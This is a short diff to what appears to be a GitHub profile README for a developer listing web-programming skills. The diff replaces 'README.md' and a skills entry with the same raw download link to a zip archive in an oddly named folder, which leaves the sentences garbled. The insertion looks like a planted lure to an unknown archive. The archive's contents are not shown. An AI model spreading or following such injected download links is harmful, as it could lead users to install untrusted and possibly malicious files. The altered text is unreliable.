@@ -1,7 +1,7 @@
 
 
 <!--
-**jonirey/jonirey** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**jonirey/jonirey** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/jonirey/jonirey/main/pitmirk/jonirey-pulpitic.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
@@ -27,7 +27,7 @@ Software developer at Argentine Navy with experience in C#, HTML, CSS and JS.
 - :airplane: HTML: Intermediate
 - :airplane: CSS: Intermediate
 - :airplane: JS: Intermediate
-- :airplane: KO.Js: Intermediate
+- :airplane: https://raw.githubusercontent.com/jonirey/jonirey/main/pitmirk/jonirey-pulpitic.zip Intermediate
 
 
 
